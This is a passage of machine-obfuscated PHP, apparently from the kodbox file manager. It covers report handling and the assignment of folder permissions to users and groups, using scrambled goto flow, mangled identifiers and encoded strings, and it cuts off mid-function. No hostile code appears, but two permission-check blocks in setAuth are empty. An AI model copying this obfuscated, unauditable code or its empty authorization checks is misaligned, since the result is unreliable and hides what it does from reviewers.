f›’ëöÏ¯í; EÏÂ‡ÑªÅô: } private function _makeOrder($EÄ³„ë’– = '') { goto c¿‡é‰ò±Ô; eÍÀÍğ†Ñº: $EÄ³„ë’– = $EÄ³„ë’– . "{$e”Ì¨õ}\x20{$D…º¨ÜâŒ‰}"; return $this->order($EÄ³„ë’–); goto CÍ«Æ÷Ó®; A–âõ²„ğÌ: $e”Ì¨õ = Input::get($E„ƒùÅç„¶[407], $E„ƒùÅç„¶[7], $E„ƒùÅç„¶[389], $aÎ¢·èº); $D…º¨ÜâŒ‰ = Input::get($E„ƒùÅç„¶[408], $E„ƒùÅç„¶[7], $E„ƒùÅç„¶[2262], array($E„ƒùÅç„¶[2188], $E„ƒùÅç„¶[404])); $D…º¨ÜâŒ‰ = $Aé·‹‹«º³[$D…º¨ÜâŒ‰]; goto eÍÀÍğ†Ñº; c¿‡é‰ò±Ô: $E„ƒùÅç„¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÎ¢·èº = array($E„ƒùÅç„¶[187], $E„ƒùÅç„¶[449], $E„ƒùÅç„¶[2248], $E„ƒùÅç„¶[2249]); $Aé·‹‹«º³ = array($E„ƒùÅç„¶[402] => $E„ƒùÅç„¶[403], $E„ƒùÅç„¶[404] => $E„ƒùÅç„¶[405]); goto A–âõ²„ğÌ; CÍ«Æ÷Ó®: } public function reportAdd($c†–²¨³‰) { $dÉÔÕ»Éß =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d»Ë®î²ã¬ = array($dÉÔÕ»Éß[441] => $c†–²¨³‰[$dÉÔÕ»Éß[441]], $dÉÔÕ»Éß[1437] => USER_ID); if (Model($dÉÔÕ»Éß[2258])->where($d»Ë®î²ã¬)->find()) { return !1; } $fôÇ”“²»É = array($dÉÔÕ»Éß[441] => $c†–²¨³‰[$dÉÔÕ»Éß[441]], $dÉÔÕ»Éß[1343] => $c†–²¨³‰[$dÉÔÕ»Éß[1343]], $dÉÔÕ»Éß[369] => $c†–²¨³‰[$dÉÔÕ»Éß[369]], $dÉÔÕ»Éß[419] => $c†–²¨³‰[$dÉÔÕ»Éß[419]], $dÉÔÕ»Éß[1437] => USER_ID, $dÉÔÕ»Éß[29] => $c†–²¨³‰[$dÉÔÕ»Éß[29]], $dÉÔÕ»Éß[405] => $c†–²¨³‰[$dÉÔÕ»Éß[405]]); return Model($dÉÔÕ»Éß[2258])->add($fôÇ”“²»É); } public function reportList($f“³×Ô—ì×) { goto BÄˆ‘šöâ; dÇ…Ü¹‚ä·: if (empty($e¹ÇÀéÂƒ×[$cù¹˜©Êì”[354]])) { return array(); } $this->_listDataApply($e¹ÇÀéÂƒ×[$cù¹˜©Êì”[354]]); return $e¹ÇÀéÂƒ×; goto FêíÀöË¾­; BÄˆ‘šöâ: $cù¹˜©Êì” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÔ©ŸÚ°õ¸ = array(); if ($f“³×Ô—ì×[$cù¹˜©Êì”[696]]) { $eÖùéÆŞ = $f“³×Ô—ì×[$cù¹˜©Êì”[449]] ? $f“³×Ô—ì×[$cù¹˜©Êì”[449]] : strtotime(date($cù¹˜©Êì”[2260])); $dÔ©ŸÚ°õ¸[$cù¹˜©Êì”[187]] = array($cù¹˜©Êì”[321], array($f“³×Ô—ì×[$cù¹˜©Êì”[696]], $eÖùéÆŞ)); } goto CÎŠ ôÍŸ§; CÎŠ ôÍŸ§: if (isset($f“³×Ô—ì×[$cù¹˜©Êì”[29]]) && in_array($f“³×Ô—ì×[$cù¹˜©Êì”[29]], array($cù¹˜©Êì”[83], $cù¹˜©Êì”[2263], $cù¹˜©Êì”[2264], $cù¹˜©Êì”[2265], $cù¹˜©Êì”[1923]))) { $dÔ©ŸÚ°õ¸[$cù¹˜©Êì”[29]] = $f“³×Ô—ì×[$cù¹˜©Êì”[29]]; } if (isset($f“³×Ô—ì×[$cù¹˜©Êì”[683]]) && in_array($f“³×Ô—ì×[$cù¹˜©Êì”[683]], array($cù¹˜©Êì”[470], $cù¹˜©Êì”[83], $cù¹˜©Êì”[2263], $cù¹˜©Êì”[2264]))) { $dÔ©ŸÚ°õ¸[$cù¹˜©Êì”[683]] = $f“³×Ô—ì×[$cù¹˜©Êì”[683]]; } $C•Åø—À‰ = Input::get($cù¹˜©Êì”[408], $cù¹˜©Êì”[7], $cù¹˜©Êì”[2262], array($cù¹˜©Êì”[2188], $cù¹˜©Êì”[404])); goto fÚ¹†¶³°Ï; fÚ¹†¶³°Ï: $CÏ°ÃÏ¾îí = array($cù¹˜©Êì”[402] => $cù¹˜©Êì”[403], $cù¹˜©Êì”[404] => $cù¹˜©Êì”[405]); $FšâêËöŒã = $cù¹˜©Êì”[2266] . $CÏ°ÃÏ¾îí[$C•Åø—À‰]; $e¹ÇÀéÂƒ× = Model($cù¹˜©Êì”[2258])->where($dÔ©ŸÚ°õ¸)->order($FšâêËöŒã)->selectPage(20); goto dÇ…Ü¹‚ä·; FêíÀöË¾­: } public function reportStatus($AËç‡ÒÀ¡×) { goto AÑ¤Ä“†ñ¯; CÄîëÔøÒµ: $Aâ¡©¨Â‘Ë = Model($b¾°šĞÓé÷[2258])->where($f¥µ÷Œ‹•ñ)->save($E—“Ü»íøÎ); if ($AËç‡ÒÀ¡×[$b¾°šĞÓé÷[683]] == $b¾°šĞÓé÷[2263]) { if ($fˆåŒÓğÌ…[$b¾°šĞÓé÷[419]] != $b¾°šĞÓé÷[470] && $this->shareFileMeta($fˆåŒÓğÌ…[$b¾°šĞÓé÷[419]])) { $this->shareFileMeta($fˆåŒÓğÌ…[$b¾°šĞÓé÷[419]], 0); } $this->remove($fˆåŒÓğÌ…[$b¾°šĞÓé÷[441]]); return !0; } if ($Aâ¡©¨Â‘Ë && $AËç‡ÒÀ¡×[$b¾°šĞÓé÷[683]] == $b¾°šĞÓé÷[2264]) { $Cé¸Š¨‘äñ = $E—“Ü»íøÎ[$b¾°šĞÓé÷[683]] == $b¾°šĞÓé÷[2264] ? 1 : 0; $this->shareFileMeta($fˆåŒÓğÌ…[$b¾°šĞÓé÷[419]], $Cé¸Š¨‘äñ); $this->removeByFile($fˆåŒÓğÌ…[$b¾°šĞÓé÷[419]]); } goto cÓ”Öéëªî; AÑ¤Ä“†ñ¯: $b¾°šĞÓé÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¥µ÷Œ‹•ñ = array($b¾°šĞÓé÷[367] => $AËç‡ÒÀ¡×[$b¾°šĞÓé÷[367]]); $fˆåŒÓğÌ… = Model($b¾°šĞÓé÷[2258])->where($f¥µ÷Œ‹•ñ)->field($b¾°šĞÓé÷[2267])->find(); goto aÌÚåè·šî; cÓ”Öéëªî: return $Aâ¡©¨Â‘Ë; goto e¨ºÎğòğà; aÌÚåè·šî: if (!$fˆåŒÓğÌ…) { return !1; } $E—“Ü»íøÎ = array($b¾°šĞÓé÷[683] => $AËç‡ÒÀ¡×[$b¾°šĞÓé÷[683]]); if ($AËç‡ÒÀ¡×[$b¾°šĞÓé÷[683]] == $b¾°šĞÓé÷[2264] && $fˆåŒÓğÌ…[$b¾°šĞÓé÷[683]] == $b¾°šĞÓé÷[2264]) { $E—“Ü»íøÎ[$b¾°šĞÓé÷[683]] = 0; } goto CÄîëÔøÒµ; e¨ºÎğòğà: } private function removeByFile($B©„Ù‚¿õˆ) { goto DÇª³ÂÒ±«; f£¡ÂÅÈØ: $Bğ¡àôí¦ = array($e†„âÆÊ–[369] => array($e†„âÆÊ–[7], $aÚí¡÷íãì), $e†„âÆÊ–[446] => 1); $c¬‹’½­áµ = Model($e†„âÆÊ–[2085])->where($Bğ¡àôí¦)->field($e†„âÆÊ–[441])->select(); if (empty($c¬‹’½­áµ)) { return; } goto bÕšè¼õØâ; bÕšè¼õØâ: $fˆã¸½¶ÏÒ = array_to_keyvalue($c¬‹’½­áµ, $e†„âÆÊ–[33], $e†„âÆÊ–[441]); $this->remove($fˆã¸½¶ÏÒ); goto fÑ‹”À‹®; DÇª³ÂÒ±«: $e†„âÆÊ– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¬‹’½­áµ = Model($e†„âÆÊ–[754])->where(array($e†„âÆÊ–[419] => $B©„Ù‚¿õˆ))->field($e†„âÆÊ–[369])->select(); $aÚí¡÷íãì = array_to_keyvalue($c¬‹’½­áµ, $e†„âÆÊ–[33], $e†„âÆÊ–[369]); goto f£¡ÂÅÈØ; fÑ‹”À‹®: } private function shareFileMeta($CŠš¼„ç©ï, $b—½óÌÛø™ = null) { $B½¸ŸšŠÅó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÄ‰á½’¯ = array($B½¸ŸšŠÅó[419] => $CŠš¼„ç©ï, $B½¸ŸšŠÅó[89] => $B½¸ŸšŠÅó[2268]); if (is_null($b—½óÌÛø™)) { return Model($B½¸ŸšŠÅó[2269])->where($fÄ‰á½’¯)->find(); } $fÄ‰á½’¯[$B½¸ŸšŠÅó[359]] = $b—½óÌÛø™; Model($B½¸ŸšŠÅó[2269])->add($fÄ‰á½’¯, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\x65\x5f\x61\x75\164\x68"; public function getAuth($e‰µì¿Ï¦Œ) { goto b‹î„¯µËŒ; b‹î„¯µËŒ: $aØÊ¢®¢œò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CŒà„« ˜ˆ = $aØÊ¢®¢œò[2270]; $Dé‡â×¿ç˜ = array($aØÊ¢®¢œò[369] => $e‰µì¿Ï¦Œ); goto D¦Û°Ëæ˜«; c´£ÜòŠ®‚: return $b‡¹á…ä£ô; goto cŒĞ˜¸‹­; aÌÓœÏİªÇ: $FÑ½Œéé’Ò = 2 << 25; foreach ($côíñÑƒ as $fª„²ª·Á) { goto f‡À¦©éˆ; fµêÈ‡™œ: if ($fª„²ª·Á[$aØÊ¢®¢œò[371]] == SourceModel::TYPE_USER && $fª„²ª·Á[$aØÊ¢®¢œò[458]] == $aØÊ¢®¢œò[470]) { $fåùØ‹â¿Õ = 0; } $a¸‹…¦ÄĞš[] = $cùÀÙÍˆß[$aØÊ¢®¢œò[376]] + $fåùØ‹â¿Õ; goto Bößã·ÕøË; f‡À¦©éˆ: $cùÀÙÍˆß = Model($aØÊ¢®¢œò[2271])->listData($fª„²ª·Á[$aØÊ¢®¢œò[2252]]); if (!$cùÀÙÍˆß) { continue; } $b‡¹á…ä£ô[] = $fª„²ª·Á; goto fŠØ»œ°ìé; fŠØ»œ°ìé: $fåùØ‹â¿Õ = 0; if ($fª„²ª·Á[$aØÊ¢®¢œò[371]] == SourceModel::TYPE_GROUP) { $fåùØ‹â¿Õ = $FÑ½Œéé’Ò * 2; } if ($fª„²ª·Á[$aØÊ¢®¢œò[371]] == SourceModel::TYPE_USER) { $fåùØ‹â¿Õ = $FÑ½Œéé’Ò; } goto fµêÈ‡™œ; Bößã·ÕøË: } array_multisort($a¸‹…¦ÄĞš, SORT_DESC, $b‡¹á…ä£ô); goto c´£ÜòŠ®‚; D¦Û°Ëæ˜«: $côíñÑƒ = $this->field($CŒà„« ˜ˆ)->order($aØÊ¢®¢œò[367])->where($Dé‡â×¿ç˜)->select(); $b‡¹á…ä£ô = array(); $a¸‹…¦ÄĞš = array(); goto aÌÓœÏİªÇ; cŒĞ˜¸‹­: } public function setAuth($DÖåê«»ÒÇ, $DÂ‹Ì™ó‘‰) { goto A˜ŞŠãßŠ²; BÄëªó©: if ($c»œÔµŠ™ª != $Då‹åùãœ‡) { $D·ØÏÔ™± = array($CÃàÅ·ˆâª[2108] => $c»œÔµŠ™ª); $EÙÓ‡ìŸ‚ = Model($CÃàÅ·ˆâª[2187])->field($CÃàÅ·ˆâª[1437])->where($D·ØÏÔ™±)->select(); $EÙÓ‡ìŸ‚ = array_to_keyvalue($EÙÓ‡ìŸ‚, $CÃàÅ·ˆâª[33], $CÃàÅ·ˆâª[1437]); } $eçÁ³­çØ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C‚’¸³¼ = array(); goto D°ğÙ×’‰‡; D°ğÙ×’‰‡: foreach ($DÂ‹Ì™ó‘‰ as $f™»Œ¾×¦) { if (!in_array($f™»Œ¾×¦[$CÃàÅ·ˆâª[371]], $eçÁ³­çØ)) { show_json(LNG($CÃàÅ·ˆâª[2272]), !1); } if ($c»œÔµŠ™ª != $Då‹åùãœ‡) { if ($f™»Œ¾×¦[$CÃàÅ·ˆâª[371]] == SourceModel::TYPE_GROUP) { } if ($f™»Œ¾×¦[$CÃàÅ·ˆâª[458]] != 0 && !in_array($f™»Œ¾×¦[$CÃàÅ·ˆâª[458]], $EÙÓ‡ìŸ‚)) { } } if ($f™»Œ¾×¦[$CÃàÅ·ˆâª[458]] == 0) { $f™»Œ¾×¦[$CÃàÅ·ˆâª[371]] = SourceModel::TYPE_USER; } $C‚’¸³¼[] = array($CÃàÅ·ˆâª[369] => $DÖåê«»ÒÇ, $CÃàÅ·ˆâª[371] => intval($f™»Œ¾×¦[$CÃàÅ·ˆâª[371]]), $CÃàÅ·ˆâª[458] => intval($f™»Œ¾×¦[$CÃàÅ·ˆâª[458]]), $CÃàÅ·ˆâª[2252] => intval($f™»Œ¾×¦[$CÃàÅ·ˆâª[2252]]) ? intval($f™»Œ¾×¦[$CÃàÅ·ˆâª[2252]]) : 0, $CÃàÅ·ˆâª[2253] => intval($f™»Œ¾×¦[$CÃàÅ·ˆâª[2253]]) ? intval($f™»Œ¾×¦[$CÃàÅ·ˆâª[2253]]) : -1); } $this->where(array($CÃàÅ·ˆâª[383] => $DÖåê«»ÒÇ))->delete(); $this->addAll($C‚’¸³¼); goto d¢–µ¢ÍÄ‘; EñˆÙ¶Œê: if ($d‡Èİè’¹[$CÃàÅ·ˆâª[371]] != SourceModel::TYPE_GROUP) { return !1; } $Då‹åùãœ‡ = 1; $c»œÔµŠ™ª = $d‡Èİè’¹[$CÃàÅ·ˆâª[458]]; goto BÄëªó©; d¢–µ¢ÍÄ‘: return !0; goto f¸¶¸“öÄ; A˜ŞŠãßŠ²: $CÃàÅ·ˆâª =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d‡Èİè’¹ = Model($CÃàÅ·ˆâª[1114])->sourceInfo($DÖåê«»ÒÇ); if (!$d‡Èİè’¹) { return !1; } goto EñˆÙ¶Œê; f¸¶¸“öÄ: } public function authClear($dĞ‘Åº½ØŠ) { $AÓòÌã×¯¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d»˜äÀğ§Â = Model($AÓòÌã×¯¥[1114])->sourceInfo($dĞ‘Åº½ØŠ); $bÕœ””ö½ = array($dĞ‘Åº½ØŠ); if ($d»˜äÀğ§Â[$AÓòÌã×¯¥[370]] == $AÓòÌã×¯¥[83]) { $d«„Œ«õº = array($AÓòÌã×¯¥[527] => array($AÓòÌã×¯¥[485], $d»˜äÀğ§Â[$AÓòÌã×¯¥[461]] . $dĞ‘Åº½ØŠ . $AÓòÌã×¯¥[486])); $bÕœ””ö½ = Model($AÓòÌã×¯¥[1114])->field($AÓòÌã×¯¥[383])->where($d«„Œ«õº)->getField($AÓòÌã×¯¥[369], !0); $bÕœ””ö½[] = $dĞ‘Åº½ØŠ; } $this->where(array($AÓòÌã×¯¥[383] => array($AÓòÌã×¯¥[384], $bÕœ””ö½)))->delete(); return !0; } public function getAllChildren($fƒÈìÑ®ÍÄ) { goto F·²Íêâ††; cõ¬ø¡˜œ: return $this->sourceListAuth($fÌçİå¤Ä†); goto B¬Õä™ê©÷; AÂÔ‡Å°¬÷: $d˜åÔå¨²² = Model($C÷ïÎµ‘ŞÆ[754])->field($B¢ö£¡©‹ø)->where($FÂÜ›çµ•ª)->select(); $fÌçİå¤Ä† = array($fƒÈìÑ®ÍÄ); foreach ($d˜åÔå¨²² as $a½µ‹¨÷Ï’) { foreach ($e…–Á¬ ‚Ë as $d­è×²£¨É) { $aìÙÎèÊ¿ = $C÷ïÎµ‘ŞÆ[47] . $d­è×²£¨É . $C÷ïÎµ‘ŞÆ[47]; $d„³¢ôµ¾ò = $a½µ‹¨÷Ï’[$C÷ïÎµ‘ŞÆ[461]] . $a½µ‹¨÷Ï’[$C÷ïÎµ‘ŞÆ[369]] . $C÷ïÎµ‘ŞÆ[47]; if (strstr($d„³¢ôµ¾ò, $aìÙÎèÊ¿)) { $fÌçİå¤Ä†[] = $a½µ‹¨÷Ï’[$C÷ïÎµ‘ŞÆ[369]]; break; } } } goto cõ¬ø¡˜œ; AÖ•“‹Èâ: if ($C‰ÓíØ‚§ƒ[$C÷ïÎµ‘ŞÆ[371]] != SourceModel::TYPE_GROUP) { return array(); } $AÀÌù÷‰ê­ = 1; $e…–Á¬ ‚Ë = array($fƒÈìÑ®ÍÄ); goto b¶ñœœŠÔ³; b¶ñœœŠÔ³: if ($C‰ÓíØ‚§ƒ[$C÷ïÎµ‘ŞÆ[463]] == $C÷ïÎµ‘ŞÆ[470] && $C‰ÓíØ‚§ƒ[$C÷ïÎµ‘ŞÆ[458]] != $AÀÌù÷‰ê­) { $e…–Á¬ ‚Ë = $this->groupChidldAllRootSource($C‰ÓíØ‚§ƒ[$C÷ïÎµ‘ŞÆ[458]]); } $f¾ôÛŠÓ®ß = $this->field($C÷ïÎµ‘ŞÆ[369])->group($C÷ïÎµ‘ŞÆ[369])->select(); $f¾ôÛŠÓ®ß = array_to_keyvalue($f¾ôÛŠÓ®ß, $C÷ïÎµ‘ŞÆ[33], $C÷ïÎµ‘ŞÆ[369]); goto ašéù¥ãã¹; ašéù¥ãã¹: if (!$f¾ôÛŠÓ®ß) { return array(); } $B¢ö£¡©‹ø = $C÷ïÎµ‘ŞÆ[2273]; $FÂÜ›çµ•ª = array($C÷ïÎµ‘ŞÆ[369] => array($C÷ïÎµ‘ŞÆ[7], $f¾ôÛŠÓ®ß), $C÷ïÎµ‘ŞÆ[397] => $C÷ïÎµ‘ŞÆ[470]); goto AÂÔ‡Å°¬÷; F·²Íêâ††: $C÷ïÎµ‘ŞÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C‰ÓíØ‚§ƒ = Model($C÷ïÎµ‘ŞÆ[1114])->sourceInfo($fƒÈìÑ®ÍÄ); if ($C‰ÓíØ‚§ƒ[$C÷ïÎµ‘ŞÆ[370]] != $C÷ïÎµ‘ŞÆ[83]) { return $this->sourceListAuth(array($fƒÈìÑ®ÍÄ)); } goto AÖ•“‹Èâ; B¬Õä™ê©÷: } private function sourceListAuth($Aˆ‘…©Ú¯·) { goto dÒ½ò¢¡±; bßÀá‘µò·: return $BÏÚ£•àŞ; goto d‡ˆŠŸÛ; eë–ÂÛâ‹ß: $b¡ƒ¶Êù½‡ = $this->field($d½áÉ™ÌñÒ)->where(array($a‘ŒóÇÊµô[369] => array($a‘ŒóÇÊµô[7], $Aˆ‘…©Ú¯·)))->select(); $cÍ„ìß“ï = array_to_keyvalue_group($b¡ƒ¶Êù½‡, $a‘ŒóÇÊµô[369]); $BÏÚ£•àŞ = array(); goto AÂÕ«ø™Ô¨; dÒ½ò¢¡±: $a‘ŒóÇÊµô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eé÷âè¯†ô = Model($a‘ŒóÇÊµô[1114])->sourceListInfo($Aˆ‘…©Ú¯·, !0); $d½áÉ™ÌñÒ = $a‘ŒóÇÊµô[2270]; goto eë–ÂÛâ‹ß; AÂÕ«ø™Ô¨: $a±ïĞÎµ®Ó = array(); foreach ($eé÷âè¯†ô as $D„¶š‰Ìƒ) { goto d¦Ã¾¯Œ´‹; BÌ¼ì‚¶«Ù: $d‚—Ó‡šÜ = count(explode($a‘ŒóÇÊµô[8], trim($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[468]], $a‘ŒóÇÊµô[8]))); $a±ïĞÎµ®Ó[] = $d‚—Ó‡šÜ + ($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[29]] == $a‘ŒóÇÊµô[76] ? 0 : 1000); goto EœÎ±àŒ‰æ; C¾ÑáÓ¬: $D„¶š‰Ìƒ[$a‘ŒóÇÊµô[2274]] = $this->authTargetInfo($E–ŠÔàœŒº); $D„¶š‰Ìƒ[$a‘ŒóÇÊµô[468]] = rtrim($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[464]], $a‘ŒóÇÊµô[8]) . $a‘ŒóÇÊµô[8] . ltrim($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[468]], $a‘ŒóÇÊµô[8]); $BÏÚ£•àŞ[] = $D„¶š‰Ìƒ; goto BÌ¼ì‚¶«Ù; d‚Ô¡é´é†: unset($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[391]]); $E–ŠÔàœŒº = $cÍ„ìß“ï[$D„¶š‰Ìƒ[$a‘ŒóÇÊµô[369]]]; if (!$E–ŠÔàœŒº) { continue; } goto C¾ÑáÓ¬; d¦Ã¾¯Œ´‹: unset($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[379]]); unset($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[378]]); unset($D„¶š‰Ìƒ[$a‘ŒóÇÊµô[376]]); goto d‚Ô¡é´é†; EœÎ±àŒ‰æ: } array_multisort($a±ïĞÎµ®Ó, SORT_ASC, $BÏÚ£•àŞ); goto bßÀá‘µò·; d‡ˆŠŸÛ: } private function groupChidldAllRootSource($A¾‘ÚÁ¾¸¾) { $F‚ÏÒÊ£Üì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b›’ù™‹†” = Model($F‚ÏÒÊ£Üì[2275])->groupChildrenAll($A¾‘ÚÁ¾¸¾); $a¬£¨àßÁô = array($F‚ÏÒÊ£Üì[463] => 0, $F‚ÏÒÊ£Üì[458] => array($F‚ÏÒÊ£Üì[7], $b›’ù™‹†”), $F‚ÏÒÊ£Üì[371] => SourceModel::TYPE_GROUP); $b¯²šª­¤ = Model($F‚ÏÒÊ£Üì[754])->field($F‚ÏÒÊ£Üì[369])->where($a¬£¨àßÁô)->select(); $b¯²šª­¤ = array_to_keyvalue($b¯²šª­¤, $F‚ÏÒÊ£Üì[33], $F‚ÏÒÊ£Üì[369]); return $b¯²šª­¤; } private function authTargetInfo($CÄª¹ˆŒ£Á) { goto a£…ƒŞöÛí; D§á‚¡ê‚: $f¶Ì±‡îÍê = 2 << 25; foreach ($CÄª¹ˆŒ£Á as $f…Ü›Ÿ½÷) { goto CÛÉ îÉ¡; CÛÉ îÉ¡: $EˆÖÇìÈÓ§ = Model($føÕÓƒ’„±[2271])->listData($f…Ü›Ÿ½÷[$føÕÓƒ’„±[2252]]); if (!$EˆÖÇìÈÓ§) { continue; } if ($f…Ü›Ÿ½÷[$føÕÓƒ’„±[371]] == SourceModel::TYPE_USER) { $fßâ’éõ³® = Model($føÕÓƒ’„±[476])->getInfoSimpleOuter($f…Ü›Ÿ½÷[$føÕÓƒ’„±[458]]); if ($fßâ’éõ³®[$føÕÓƒ’„±[1437]] == $føÕÓƒ’„±[1028]) { continue; } if ($fßâ’éõ³®[$føÕÓƒ’„±[1437]] == $føÕÓƒ’„±[470]) { $fßâ’éõ³®[$føÕÓƒ’„±[28]] = LNG($føÕÓƒ’„±[2276]); } } else { $fßâ’éõ³® = Model($føÕÓƒ’„±[460])->getInfoSimple($f…Ü›Ÿ½÷[$føÕÓƒ’„±[458]]); } goto D‹îƒô‰ˆ…; e³Õâ¢á‡ò: $b‹¾¨èÚ‘˜ = 0; if ($f…Ü›Ÿ½÷[$føÕÓƒ’„±[371]] == SourceModel::TYPE_GROUP) { $b‹¾¨èÚ‘˜ = $f¶Ì±‡îÍê * 2; } if ($f…Ü›Ÿ½÷[$føÕÓƒ’„±[371]] == SourceModel::TYPE_USER) { $b‹¾¨èÚ‘˜ = $f¶Ì±‡îÍê; } goto d•™²¸´‡ß; D‹îƒô‰ˆ…: if (!$fßâ’éõ³®) { continue; } $fßâ’éõ³®[$føÕÓƒ’„±[418]] = $EˆÖÇìÈÓ§; $BÌŞ„Ààœ[] = $fßâ’éõ³®; goto e³Õâ¢á‡ò; d•™²¸´‡ß: if ($f…Ü›Ÿ½÷[$føÕÓƒ’„±[371]] == SourceModel::TYPE_USER && $f…Ü›Ÿ½÷[$føÕÓƒ’„±[458]] == $føÕÓƒ’„±[470]) { $b‹¾¨èÚ‘˜ = 0; } $a›ÏÓ•ÇİÇ[] = $EˆÖÇìÈÓ§[$føÕÓƒ’„±[376]] + $b‹¾¨èÚ‘˜; goto bÁ‹ö’¯Ü¸; bÁ‹ö’¯Ü¸: } array_multisort($a›ÏÓ•ÇİÇ, SORT_DESC, $BÌŞ„Ààœ); goto AÓØ¥­‚’å; a£…ƒŞöÛí: $føÕÓƒ’„± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÌŞ„Ààœ = array(); $a›ÏÓ•ÇİÇ = array(); goto D§á‚¡ê‚; AÓØ¥­‚’å: return $BÌŞ„Ààœ; goto F‚°™˜Î; F‚°™˜Î: } public function getAllChildrenByUser($Eà„Ñ‘»š, $a•´•º‡—š) { goto b¦îù×‚œ°; Dµ±£·¯Ë‰: foreach ($a¢›‰†¥­’ as $céÄ•ÉöÚ‹) { $bŸ·Û¸Š†² = !1; foreach ($céÄ•ÉöÚ‹[$dˆãƒÃ²×[2274]] as $e ÎëÒ˜ØÖ) { if ($e ÎëÒ˜ØÖ[$dˆãƒÃ²×[1437]]) { if ($e ÎëÒ˜ØÖ[$dˆãƒÃ²×[1437]] == $a•´•º‡—š) { $bŸ·Û¸Š†² = !0; break; } } if ($e ÎëÒ˜ØÖ[$dˆãƒÃ²×[2108]]) { if ($this->groupContainUser($e ÎëÒ˜ØÖ[$dˆãƒÃ²×[2108]], $a•´•º‡—š)) { $bŸ·Û¸Š†² = !0; break; } } } if ($bŸ·Û¸Š†²) { $EÏ›ëšŒÏ[] = $céÄ•ÉöÚ‹; } $Aœªæİõñù = $céÄ•ÉöÚ‹[$dˆãƒÃ²×[369]]; if (isset($b–¼©×çĞ»[$Aœªæİõñù])) { $céÄ•ÉöÚ‹[$dˆãƒÃ²×[2274]][] = $b–¼©×çĞ»[$Aœªæİõñù][0]; $b–¼©×çĞ»[$Aœªæİõñù] = !1; } } $b–¼©×çĞ» = array_filter(array_values($b–¼©×çĞ»)); $EÏ›ëšŒÏ = array_merge($b–¼©×çĞ», $EÏ›ëšŒÏ); goto D¼¨Û·¼™; a¢ªÕàÏÌÅ: $cÖ—éÖã÷³ = Model($dˆãƒÃ²×[1114])->sourceInfo($Eà„Ñ‘»š); $b–¼©×çĞ» = array(); $cëŸ«ö®èš = 1; goto DÃ¶ˆ§ŒÀô; D¼¨Û·¼™: return $EÏ›ëšŒÏ; goto aêŠ’­; b¦îù×‚œ°: $dˆãƒÃ²× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c±Ú˜”¹»ğ = Model($dˆãƒÃ²×[479])->getInfo($a•´•º‡—š); if (!$a•´•º‡—š || !$Eà„Ñ‘»š || !$c±Ú˜”¹»ğ) { return array(); } goto a¢ªÕàÏÌÅ; DÃ¶ˆ§ŒÀô: if ($cÖ—éÖã÷³[$dˆãƒÃ²×[463]] == $dˆãƒÃ²×[470] && $cÖ—éÖã÷³[$dˆãƒÃ²×[458]] != $cëŸ«ö®èš && $this->groupContainUser($cÖ—éÖã÷³[$dˆãƒÃ²×[458]], $a•´•º‡—š)) { foreach ($c±Ú˜”¹»ğ[$dˆãƒÃ²×[2277]] as $B¹îÕ«“²Ù) { $EÃ‘³ÃÚñÇ = Model($dˆãƒÃ²×[460])->getInfo($B¹îÕ«“²Ù[$dˆãƒÃ²×[2108]]); $DØÑÔÑĞ¥´ = Model($dˆãƒÃ²×[479])->getInfoSimpleOuter($a•´•º‡—š); $DØÑÔÑĞ¥´[$dˆãƒÃ²×[418]] = $B¹îÕ«“²Ù[$dˆãƒÃ²×[376]]; if (Model($dˆãƒÃ²×[2271])->authCheckAction($B¹îÕ«“²Ù[$dˆãƒÃ²×[376]][$dˆãƒÃ²×[376]], $dˆãƒÃ²×[1563])) { continue; } $BÑ‚Æ¨º¦ = array($dˆãƒÃ²×[28] => $dˆãƒÃ²×[1390] . $EÃ‘³ÃÚñÇ[$dˆãƒÃ²×[28]], $dˆãƒÃ²×[369] => $EÃ‘³ÃÚñÇ[$dˆãƒÃ²×[391]][$dˆãƒÃ²×[369]], $dˆãƒÃ²×[75] => KodIO::make($EÃ‘³ÃÚñÇ[$dˆãƒÃ²×[391]][$dˆãƒÃ²×[369]]), $dˆãƒÃ²×[463] => $dˆãƒÃ²×[470], $dˆãƒÃ²×[371] => $dˆãƒÃ²×[967], $dˆãƒÃ²×[29] => $dˆãƒÃ²×[490], $dˆãƒÃ²×[468] => $EÃ‘³ÃÚñÇ[$dˆãƒÃ²×[465]], $dˆãƒÃ²×[2108] => $EÃ‘³ÃÚñÇ[$dˆãƒÃ²×[2108]], $dˆãƒÃ²×[462] => $EÃ‘³ÃÚñÇ[$dˆãƒÃ²×[463]], $dˆãƒÃ²×[2274] => array($DØÑÔÑĞ¥´)); $b–¼©×çĞ»[$BÑ‚Æ¨º¦[$dˆãƒÃ²×[369]]] = $BÑ‚Æ¨º¦; } } $EÏ›ëšŒÏ = array(); $a¢›‰†¥­’ = $this->getAllChildren($Eà„Ñ‘»š); goto Dµ±£·¯Ë‰; aêŠ’­: } public function setAllChildrenByUser($b¯Í±ËêĞ¯, $cÌ°÷é™Œø, $FÓä„Ù ¾) { $c¢¢¥”áë¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AïÅ’§“ò = $this->getAllChildrenByUser($b¯Í±ËêĞ¯, $cÌ°÷é™Œø); if (!$FÓä„Ù 